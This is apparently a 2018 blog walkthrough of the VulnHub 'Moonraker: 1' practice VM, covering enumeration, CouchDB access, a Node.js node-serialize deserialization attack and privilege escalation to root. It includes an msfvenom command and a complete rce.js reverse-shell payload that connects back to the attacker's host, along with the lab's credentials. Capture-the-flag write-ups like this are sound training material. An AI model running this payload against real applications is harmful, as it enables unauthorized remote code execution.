---
layout: post
title: "Moonraker: 1 Walkthrough"
subtitle: "Dolly Is a Hottie"
date: 2018-10-14 08:32:04 +0000
category: Walkthrough
tags: [VulnHub, Moonraker]
comments: true
image:
  feature: moonraker-1-walkthrough.jpg
  credit: skeeze / Pixabay
  creditlink: https://pixabay.com/en/rock-arch-landscape-moon-full-sky-874766/
---

This post documents the complete walkthrough of Moonraker: 1, a boot2root VM created by [creosote][1]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

### Background

Invitation to preview Moonraker by [creosote](https://www.reddit.com/user/_creosote) :smile:

### Information Gathering

Let’s start with a `nmap` scan to establish the available services in the host.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.20.130
...
PORT      STATE SERVICE  REASON         VERSION
22/tcp    open  ssh      syn-ack ttl 64 OpenSSH 7.4p1 Debian 10+deb9u4 (protocol 2.0)
| ssh-hostkey:
|   2048 5f:bf:c0:33:51:4f:4a:a7:4a:7e:15:80:aa:d7:2a:0b (RSA)
|   256 53:59:87:1e:a4:46:bd:a7:fd:9a:5f:f9:b7:40:9d:2f (ECDSA)
|_  256 0d:88:d9:fa:af:08:ce:2b:13:66:a7:70:ec:49:02:10 (ED25519)
80/tcp    open  http     syn-ack ttl 64 Apache httpd 2.4.25 ((Debian))
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: MOONRAKER
3000/tcp  open  http     syn-ack ttl 64 Node.js Express framework
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=401
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
4369/tcp  open  epmd     syn-ack ttl 64 Erlang Port Mapper Daemon
| epmd-info:
|   epmd_port: 4369
|   nodes:
|_    couchdb: 35299
5984/tcp  open  couchdb? syn-ack ttl 64
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 404 Object Not Found
|     Cache-Control: must-revalidate
|     Connection: close
|     Content-Length: 58
|     Content-Type: application/json
|     Date: Fri, 12 Oct 2018 16:31:25 GMT
|     Server: CouchDB/2.2.0 (Erlang OTP/19)
|     X-Couch-Request-ID: b12af100b9
|     X-CouchDB-Body-Time: 0
|     {"error":"not_found","reason":"Database does not exist."}
|   GetRequest:
|     HTTP/1.0 200 OK
|     Cache-Control: must-revalidate
|     Connection: close
|     Content-Length: 164
|     Content-Type: application/json
|     Date: Fri, 12 Oct 2018 16:30:32 GMT
|     Server: CouchDB/2.2.0 (Erlang OTP/19)
|     X-Couch-Request-ID: b135ff0e9d
|     X-CouchDB-Body-Time: 0
|     {"couchdb":"Welcome","version":"2.2.0","git_sha":"2a16ec4","features":["pluggable-storage-engines","scheduler"],"vendor":{"name":"The Apache Software Foundation"}}
|   HTTPOptions:
|     HTTP/1.0 500 Internal Server Error
|     Cache-Control: must-revalidate
|     Connection: close
|     Content-Length: 61
|     Content-Type: application/json
|     Date: Fri, 12 Oct 2018 16:30:32 GMT
|     Server: CouchDB/2.2.0 (Erlang OTP/19)
|     X-Couch-Request-ID: be32ef8e00
|     X-Couch-Stack-Hash: 1828508689
|     X-CouchDB-Body-Time: 0
|_    {"error":"unknown_error","reason":"badarg","ref":1828508689}
```

`nmap` finds the following open ports: `22/tcp`, `80/tcp`, `3000/tcp`, `4369/tcp`, and `5984/tcp`. In any case, let's go with the web.

### Directory / File Enumeration

I use `gobuster` and the biggest wordlist from DirBuster to fuzz for directories.

```
# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -e -u http://moonraker/

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://moonraker/
[+] Threads      : 20
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Expanded     : true
[+] Timeout      : 10s
=====================================================
2018/10/12 08:39:03 Starting gobuster
=====================================================
http://moonraker/services (Status: 301)
http://moonraker/cats (Status: 301)
http://moonraker/accounting (Status: 301)
http://moonraker/server-status (Status: 403)
http://moonraker/x-files (Status: 301)
=====================================================
2018/10/12 08:40:31 Finished
=====================================================
```

I spent the next few hours fuzzing recursively to no avail. This is crazy. I had to stop. The next thing I looked at was the actual site and finally spotted what looked like an attack surface at `/svc-inq/sales.html`.

![336e19ca.png](/assets/images/posts/moonraker-1-walkthrough/336e19ca.png)

Notice the message? Someone will contact me in 5 minutes? Straight away, I started Apache Web Server and `tail` off the access log.

I then supply the following data to the inquiry form.

![3079e380.png](/assets/images/posts/moonraker-1-walkthrough/3079e380.png)

The data was written to somewhere, but where?

![cacc249e.png](/assets/images/posts/moonraker-1-walkthrough/cacc249e.png)

There's also an interesting comment hidden in the HTML source.

![b60598b8.png](/assets/images/posts/moonraker-1-walkthrough/b60598b8.png)

A couple of minutes later, I got a request from the sales representative.

```
192.168.20.130 - - [13/Oct/2018:04:40:21 +0000] "GET /hello.txt HTTP/1.1" 200 288 "http://127.0.0.1/svc-inq/salesmoon-gui.php" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
```

A new page is exposed in the "Referer" request header.

```
http://127.0.0.1/svc-inq/salesmoon-gui.php
```

![8eadba61.png](/assets/images/posts/moonraker-1-walkthrough/8eadba61.png)

### Admin Interface

The new page exposes the Sales Admin Interface. This is how it looks like.

![7e5ff814.png](/assets/images/posts/moonraker-1-walkthrough/7e5ff814.png)

### CouchDB / Project Fauxton

Good thing I'm familiar with the RESTful nature of CouchDB and Project Fauxton.

![d3111f79.png](/assets/images/posts/moonraker-1-walkthrough/d3111f79.png)

I log in to Fauxton with Jaw's credential (`jaws:dollyx99`).

![37aaa267.png](/assets/images/posts/moonraker-1-walkthrough/37aaa267.png)

The `links` database exposes more links!

![ec76466c.png](/assets/images/posts/moonraker-1-walkthrough/ec76466c.png)

![eb39afd6.png](/assets/images/posts/moonraker-1-walkthrough/eb39afd6.png)

![21faa2e4.png](/assets/images/posts/moonraker-1-walkthrough/21faa2e4.png)

### Node.js Deserialization

Another important hint lies in **Hugo's page moved to port 3k**.

![8c0356d2.png](/assets/images/posts/moonraker-1-walkthrough/8c0356d2.png)

The username and password can be found in the HR offer letters to Hugo. :laughing:

![5912322c.png](/assets/images/posts/moonraker-1-walkthrough/5912322c.png)

![cc673fca.png](/assets/images/posts/moonraker-1-walkthrough/cc673fca.png)

Upon logging in, a cookie was created.

![febf16dc.png](/assets/images/posts/moonraker-1-walkthrough/febf16dc.png)

Again, I'm familiar with Node.js deserialization exploit. You can read about it [here](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/).

### Low-Privilege Shell

There’s a slight difference though—I’m using the reverse shell generated by `msfvenom` instead.

```
# msfvenom -p nodejs/shell_reverse_tcp LHOST=192.168.20.128 LPORT=1234
```

Incorporate the output from `msfvenom` into `rce.js`. Remember to remove the enclosing round brackets.

<div class="filename"><span>rce.js</span></div>

```js
var rev = {
rce: function(){ var require = global.require || global.process.mainModule.constructor._load; if (!require) return; var cmd = (global.process.platform.match(/^win/i)) ? "cmd" : "/bin/sh"; var net = require("net"), cp = require("child_process"), util = require("util"), sh = cp.spawn(cmd, []); var client = this; var counter=0; function StagerRepeat(){ client.socket = net.connect(1234, "192.168.20.128", function() { client.socket.pipe(sh.stdin); if (typeof util.pump === "undefined") { sh.stdout.pipe(client.socket); sh.stderr.pipe(client.socket); } else { util.pump(sh.stdout, client.socket); util.pump(sh.stderr, client.socket); } }); socket.on("error", function(error) { counter++; if(counter<= 10){ setTimeout(function() { StagerRepeat();}, 5*1000); } else process.exit(); }); } StagerRepeat(); }
};

var serialize = require('node-serialize');
console.log(serialize.serialize(rev));
```

Run `node rce.js` to get the serialized string output.

![3e4d2d0a.png](/assets/images/posts/moonraker-1-walkthrough/3e4d2d0a.png)

Next, add the [IIFE](https://en.wikipedia.org/wiki/Immediately-invoked_function_expression) bracket `()` at the end of the serialized string output from the previous step before passing it to base64 for encoding.

![c3590819.png](/assets/images/posts/moonraker-1-walkthrough/c3590819.png)

Set the entire `base64` string as the value in the `profile` cookie and refresh the page in your browser. But before you do that, you want to set up your nc listener.

![4d68e56d.png](/assets/images/posts/moonraker-1-walkthrough/4d68e56d.png)

As expected, the `nc` listener caught the reverse shell.

### Privilege Escalation

During enumeration of `jaws`'s account, I noticed that Postfix is installed and listening locally at `25/tcp`.

![a161ae39.png](/assets/images/posts/moonraker-1-walkthrough/a161ae39.png)

Pivoting on that, I noticed four mailboxes in `/var/mail` but I lacked the permissions to read them.

![cad72d13.png](/assets/images/posts/moonraker-1-walkthrough/cad72d13.png)

I guess the challenge now is to enumerate harder to find the login password of one of the accounts shown above.

As I was looking for world-writeable files, I came across CouchDB's configuration at `/opt/couchdb/etc/local.ini`. Guess what's in there?

![d8396cf6.png](/assets/images/posts/moonraker-1-walkthrough/d8396cf6.png)

Armed with `hugo`'s password, I can log in to his account and read his mails.

![64d475ac.png](/assets/images/posts/moonraker-1-walkthrough/64d475ac.png)

We have an interesting email.

![8135673d.png](/assets/images/posts/moonraker-1-walkthrough/8135673d.png)

What do we have here? Half of the new `root`'s password and the old password hash.

Let's copy the old password hash and send it to John the Ripper for offline cracking!

![623be549.png](/assets/images/posts/moonraker-1-walkthrough/623be549.png)

The new password must be "`cyberVR00M`".

![af53ca6b.png](/assets/images/posts/moonraker-1-walkthrough/af53ca6b.png)

### Was Dolly Wearing Braces?

![3d059e8e.png](/assets/images/posts/moonraker-1-walkthrough/3d059e8e.png)

:dancer:

### Afterthought

Mandela Effect?

![831338f7.png](/assets/images/posts/moonraker-1-walkthrough/831338f7.png)

[1]: https://www.reddit.com/user/_creosote